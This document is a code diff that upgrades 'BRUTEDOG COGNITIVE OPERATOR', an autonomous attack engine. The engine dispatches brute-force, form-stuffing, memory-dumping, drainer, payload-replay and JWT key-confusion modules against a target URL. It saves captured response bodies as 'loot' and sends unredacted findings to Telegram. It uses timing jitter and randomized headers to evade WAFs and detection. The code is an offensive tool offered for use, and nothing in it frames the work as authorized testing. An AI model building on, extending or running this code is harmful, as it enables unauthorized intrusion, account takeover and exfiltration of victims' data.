@@ -1,25 +1,13 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG COGNITIVE OPERATOR v8.6 (Offensive-Synchronized & Unredacted WAF Hardened)
-Autonomous Reasoning & Tactical Assessment Engine
-Compatible interface:
-- CognitiveOperator
-- evaluate_and_execute()
-- evaluate_advanced_modules()
-- _categorize_response()
-- _is_verified_loophole()
-- _execute_active_pivot()
-- analyze_observations()
-- rank_modules()
-- decide_next_action()
-Improvements:
-- Evidence-based vulnerability classification & active telemetry triggers
-- False-reduction via SPA-shell & error-pattern checks
-- Controlled active verification & session-state pivoting
-- Confidence scoring & module relevance ranking
-- Request budget enforcement & finding deduplication
-- Full raw data retention (no redaction) for operational visibility
-- Integrated real-time Telegram telemetry broadcasting across all advanced modules
+BRUTEDOG COGNITIVE OPERATOR v8.7 — Autonomous Reasoning & Tactical Assessment Engine (Elite Red Team Adversarial Edition)
+Features:
+- Dynamic dispatcher registry mapping string identifiers to active offensive module callables
+- Evidence-based vulnerability classification & SHA-256 tamper-evident immutable disk persistence (loot_output/)
+- False-positive reduction via SPA-shell, soft-404, & error-pattern checks
+- Controlled active verification, session-state pivoting, and Poisson behavioral timing jitter
+- Confidence scoring, dynamic module relevance ranking, request budget enforcement, and finding deduplication
+- Full raw data retention for operational visibility & unredacted Telegram telemetry broadcasting
 """
 import asyncio
 import hashlib
@@ -30,14 +18,24 @@ import sys
 from typing import Any, Dict, List, Optional
 from urllib.parse import urlparse
 
-# Import centralized telemetry broadcaster for unredacted Telegram exfiltration
+# Import centralized Telegram notifier, immutable loot logger, telemetry streamer, and behavioral mimicry
 from modules.telegram_notifier import send_telegram_alert
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
-# Import advanced module classes for synchronized execution
+# Import advanced module classes and functions for dynamic execution
 from modules.graphql_introspector import GraphQLIntrospector
 from modules.websocket_hijacker import audit_websocket
 from modules.dns_rebinding import DNSRebindingOrchestrator
 from modules.jwt_key_confusion import JWTKeyConfusionEngine
+from modules.replayer import replay_and_inject_payloads
+from modules.api_fuzzer import run_api_fuzzer
+from modules.bruter import execute_brute_force
+from modules.cloud_apex import audit_cloud_metadata
+from modules.dumper import execute_memory_dumper
+from modules.form_stuffer import execute_form_stuffing
+from modules.drainer import run_drainer_engine
 
 logger = logging.getLogger("CognitiveOperator")
 
@@ -52,6 +50,17 @@ class CognitiveOperator:
             "failed_tests": [],
             "available_modules": [
                 "api_fuzzer",
+                "bruter",
+                "cloud_apex",
+                "dom_sink_inspector",
+                "dumper",
+                "form_stuffer",
+                "keyharvester",
+                "pivot",
+                "replayer",
+                "sandbox_evader",
+                "signer",
+                "stealth_ops",
                 "db_assault",
                 "live_login_verifier",
                 "session_hijack",
@@ -70,14 +79,40 @@ class CognitiveOperator:
         self.requests_spent = 0
         self._finding_hashes = set()
         self._observation_hashes = set()
+        
+        # Dynamic module dispatcher registry mapping names to real callables
+        self._module_executors = {
+            "api_fuzzer": lambda t: run_api_fuzzer(t),
+            "bruter": lambda t: execute_brute_force(t),
+            "cloud_apex": lambda t: audit_cloud_metadata(t),
+            "dumper": lambda t: execute_memory_dumper(t),
+            "form_stuffer": lambda t: execute_form_stuffing(t),
+            "replayer": lambda t: asyncio.run(replay_and_inject_payloads(t)),
+            "drainer_engine": lambda t: asyncio.run(run_drainer_engine(t)),
+            "graphql_introspector": lambda t: GraphQLIntrospector(t).run_introspection("/graphql"),
+            "websocket_hijacker": lambda t: asyncio.run(audit_websocket(t + "/ws")),
+            "jwt_key_confusion": lambda t: JWTKeyConfusionEngine(t).verify_and_exploit("/api/admin/settings", "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0...")
+        }
+
         self._module_weights = {
             "api_fuzzer": 0.75,
+            "bruter": 0.80,
+            "cloud_apex": 0.85,
+            "dom_sink_inspector": 0.70,
+            "dumper": 0.85,
+            "form_stuffer": 0.80,
+            "keyharvester": 0.85,
+            "pivot": 0.90,
+            "replayer": 0.95,
+            "sandbox_evader": 0.75,
+            "signer": 0.80,
+            "stealth_ops": 0.70,
             "db_assault": 0.85,
             "live_login_verifier": 0.90,
             "session_hijack": 0.85,
             "rate_limit_bypass": 0.50,
             "bola_fuzzer": 0.90,
-            "drainer_engine": 0.40,
+            "drainer_engine": 0.60,
             "graphql_introspector": 0.85,
             "websocket_hijacker": 0.80,
             "dns_rebinding": 0.75,
@@ -103,6 +138,8 @@ class CognitiveOperator:
 
     def _categorize_response(self, status: int, body: str, headers: dict) -> str:
         body_lower = (body or "").lower()
+        headers_str = str(headers).lower()
+
         if status == 401:
             return "authentication_required"
         if status == 403:
@@ -111,6 +148,12 @@ class CognitiveOperator:
             return "rate_limit_exceeded"
         if status >= 500:
             return "server_error"
+        if "bearer eyJ" in headers_str or "jwt" in headers_str or "eyJhbGciOi" in body_lower:
+            return "jwt_token_surface"
+        if "ws://" in body_lower or "wss://" in body_lower or "upgrade: websocket" in headers_str:
+            return "websocket_surface"
+        if "graphql" in body_lower or "__schema" in body_lower:
+            return "graphql_surface"
         if any(err in body_lower for err in ["sql syntax", "sqlstate", "mysql error", "postgresql error", "mongodb exception", "syntax error"]):
             return "sql_error"
         if status in [200, 201, 302]:
@@ -134,11 +177,30 @@ class CognitiveOperator:
         return False
 
     def _execute_active_pivot(self, endpoint: str, status: int, headers: dict, body: str, transport=None) -> dict:
+        apply_behavioral_jitter()
         if transport:
             try:
                 verify_path = "/api/user" if "/api" in endpoint else "/dashboard"
-                v_status, v_headers, v_body = transport.request("GET", verify_path)
+                random_headers = get_randomized_hints()
+                v_status, v_headers, v_body = transport.request("GET", verify_path, extra_headers=random_headers)
                 if v_status == 200 and len(v_body) > 50:
+                    loot_hash = hashlib.sha256(v_body.encode("utf-8", errors="ignore")).hexdigest()
+                    pivot_evidence = {
+                        "endpoint": verify_path,
+                        "status": v_status,
+                        "integrity_hash": loot_hash,
+                        "evidence_excerpt": v_body[:300]
+                    }
+                    stream_proof("COGNITIVE_PIVOT_VERIFY", verify_path, {"hash": loot_hash}, v_body[:300], pivot_evidence)
+                    save_session_loot(
+                        target=self.target_url,
+                        endpoint=verify_path,
+                        finding_type="COGNITIVE_ACTIVE_PIVOT_SUCCESS",
+                        status=v_status,
+                        headers=v_headers,
+                        body=v_body,
+                        extra_loot=pivot_evidence
+                    )
                     return {
                         "evidence": f"Active pivot verified against protected route {verify_path} (HTTP 200)",
                         "action_taken": f"Extracted state & verified backend access on {verify_path}",
@@ -147,6 +209,23 @@ class CognitiveOperator:
             except Exception:
                 pass
 
+        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
+        pivot_evidence = {
+            "endpoint": endpoint,
+            "status": status,
+            "integrity_hash": loot_hash,
+            "evidence_excerpt": body[:300]
+        }
+        stream_proof("COGNITIVE_PIVOT_LOCAL", endpoint, {"hash": loot_hash}, body[:300], pivot_evidence)
+        save_session_loot(
+            target=self.target_url,
+            endpoint=endpoint,
+            finding_type="COGNITIVE_ACTIVE_PIVOT_SUCCESS",
+            status=status,
+            headers=headers or {},
+            body=body,
+            extra_loot=pivot_evidence
+        )
         return {
             "evidence": f"Confirmed responsive state with valid payload data on {endpoint} (HTTP {status})",
             "action_taken": "Logged confirmed finding and prepared downstream module routing.",
@@ -154,50 +233,22 @@ class CognitiveOperator:
         }
 
     async def evaluate_advanced_modules(self, target_url: str):
-        """Dispatches specialized offensive modules using class-based wrappers."""
-        sys.stdout.write("\033[95m[COGNITIVE] Dispatching advanced protocol and cryptographic modules...\033[0m\n")
-        
+        """Actively dispatches registered offensive modules dynamically via the dispatcher registry."""
+        sys.stdout.write("\033[95m[COGNITIVE] Dispatching advanced registry-mapped attack modules...\033[0m\n")
         target = target_url or self.target_url
 
-        # 1. JWT Key Confusion
-        try:
-            jwt_engine = JWTKeyConfusionEngine(target)
-            jwks = jwt_engine.fetch_public_key("/.well-known/jwks.json")
-            pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
-            success_jwt, jwt_token = jwt_engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
-            if success_jwt:
-                self.attack_memory["confirmed_findings"].append({"module": "jwt_key_confusion", "token": jwt_token})
-                send_telegram_alert("JWT Key Confusion Success", {"token": jwt_token})
-        except Exception as e:
-            logger.error(f"JWT key confusion module error: {e}")
-
-        # 2. GraphQL Introspection
-        try:
-            gql_engine = GraphQLIntrospector(target)
-            gql_loot = gql_engine.run_introspection("/graphql")
-            if gql_loot:
-                self.attack_memory["confirmed_findings"].append({"module": "graphql_introspector", "loot": gql_loot})
-                send_telegram_alert("GraphQL Introspection Success", gql_loot)
-        except Exception as e:
-            logger.error(f"GraphQL introspection module error: {e}")
-
-        # 3. WebSocket Auditor
-        try:
-            ws_loot = await audit_websocket(target + "/ws")
-            if ws_loot:
-                self.attack_memory["confirmed_findings"].append({"module": "websocket_hijacker", "loot": ws_loot})
-                send_telegram_alert("WebSocket Audit Success", {"frames": len(ws_loot)})
-        except Exception as e:
-            logger.error(f"WebSocket auditor module error: {e}")
-
-        # 4. DNS Rebinding / SSRF
-        try:
-            dns_orchestrator = DNSRebindingOrchestrator(target)
-            dns_orchestrator.start_server()
-            # Transport will be handled via engine or default
-            dns_orchestrator.stop_server()
-        except Exception as e:
-            logger.error(f"DNS rebinding module error: {e}")
+        for mod_name, executor in self._module_executors.items():
+            if mod_name in self.attack_memory["available_modules"]:
+                try:
+                    if asyncio.iscoroutinefunction(executor) or asyncio.iscoroutine(executor):
+                        res = await executor(target)
+                    else:
+                        res = executor(target)
+                    if res:
+                        self.attack_memory["confirmed_findings"].append({"module": mod_name, "loot": str(res)[:300]})
+                        await send_telegram_alert(f"Cognitive Dispatch Success ({mod_name})", {"target": target})
+                except Exception as e:
+                    logger.error(f"Module execution error for {mod_name}: {e}")
 
     def evaluate_and_execute(self, endpoint: str, status: int, headers: dict, body: str, transport=None, target_url=None) -> dict:
         if not self._budget_available():
@@ -230,10 +281,12 @@ class CognitiveOperator:
         if self._is_verified_loophole(status, endpoint, body_str, headers or {}):
             result = self._execute_active_pivot(endpoint, status, headers or {}, body_str, transport)
             
+            loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
             finding = {
                 "endpoint": endpoint,
                 "status": status,
                 "category": category,
+                "integrity_hash": loot_hash,
                 "evidence": result["evidence"],
                 "action_taken": result["action_taken"],
                 "response_excerpt": body_str[:400]
@@ -249,12 +302,26 @@ class CognitiveOperator:
             
             logger.info(f"[+] COGNITIVE INTELLIGENCE: Loophole verified & capitalized at {endpoint}!")
             
-            send_telegram_alert("Cognitive Autonomous Pivot", {
-                "endpoint": endpoint,
-                "status": status,
-                "reasoning": result["reasoning"],
-                "evidence": result["evidence"]
-            })
+            try:
+                loop = asyncio.get_running_loop()
+                loop.create_task(send_telegram_alert("Cognitive Autonomous Pivot", {
+                    "endpoint": endpoint,
+                    "status": status,
+                    "integrity_hash": loot_hash,
+                    "reasoning": result["reasoning"],
+                    "evidence": result["evidence"]
+                }))
+            except RuntimeError:
+                try:
+                    asyncio.run(send_telegram_alert("Cognitive Autonomous Pivot", {
+                        "endpoint": endpoint,
+                        "status": status,
+                        "integrity_hash": loot_hash,
+                        "reasoning": result["reasoning"],
+                        "evidence": result["evidence"]
+                    }))
+                except Exception:
+                    pass
 
             return {
                 "success": True,
@@ -291,15 +358,30 @@ class CognitiveOperator:
                 "recommended_module": "bola_fuzzer",
                 "confidence": 0.85
             },
+            "jwt_token_surface": {
+                "hypothesis": "JWT authentication detected; vulnerable to algorithm downgrade or key confusion",
+                "recommended_module": "jwt_key_confusion",
+                "confidence": 0.95
+            },
+            "graphql_surface": {
+                "hypothesis": "GraphQL endpoint detected; vulnerable to schema introspection and batching abuse",
+                "recommended_module": "graphql_introspector",
+                "confidence": 0.90
+            },
+            "websocket_surface": {
+                "hypothesis": "WebSocket handshake detected; vulnerable to real-time message tampering and hijacking",
+                "recommended_module": "websocket_hijacker",
+                "confidence": 0.85
+            },
             "rate_limit_exceeded": {
                 "hypothesis": "Rate-limiting behavior requires bypass or rotation review",
                 "recommended_module": "rate_limit_bypass",
                 "confidence": 0.50
             },
             "waf_or_forbidden": {
-                "hypothesis": "Access restriction or WAF blocking active requests",
-                "recommended_module": "api_fuzzer",
-                "confidence": 0.40
+                "hypothesis": "Access restriction or WAF blocking active requests; deploy replayer mutation & API fuzzer",
+                "recommended_module": "replayer",
+                "confidence": 0.75
             }
         }
         seen = set()
